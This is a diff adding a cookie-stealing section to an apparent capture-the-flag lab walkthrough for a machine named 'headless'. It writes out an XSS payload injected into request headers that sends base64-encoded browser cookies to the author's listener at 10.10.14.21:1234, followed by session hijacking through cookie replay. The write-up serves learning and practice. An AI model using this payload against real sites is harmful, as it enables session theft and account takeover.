@@ -40,6 +40,29 @@ The `/support` URI allows payload injection, triggering a hacking protection ale
 
 ### Cookie stealing
 I looked for how to steal cookies and found this [article](https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e)
+First, I initiated a Python server on port 1234 using the command 
+`python3 -m http.server 1234`
+Then, I captured an HTTP request and sent it to Repeater. 
+Within Repeater, I injected a cookie-stealing payload into reflected headers like "User-Agent", "Accept" and "message" until I got a response. 
+`<script>var i=new Image(); i.src="http://10.10.14.21:1234/?cookie="+btoa(document.cookie);</script>`
+I repeated this process until our server intercepted and processed the injected payload.
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(130).png)
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(131).png)
+
+After setting the accept field to the payload, my server intercepted the cookie, which was encoded in base64. I then proceeded to decode the cookie to reveal its contents.
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(140).png)
+
+Now that I obtained the desired cookie, I returned to `/dashboard` and intercepted the request in Burp Suite. I replaced the original cookie with the one we discovered.
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(134).png)
+
+I forwarded the request and got this page.
+
+![image](https://raw.githubusercontent.com/brenda87/brenda87.github.io/main/assets/images/headless/Screenshot%20(133).png)
+
 
 
 
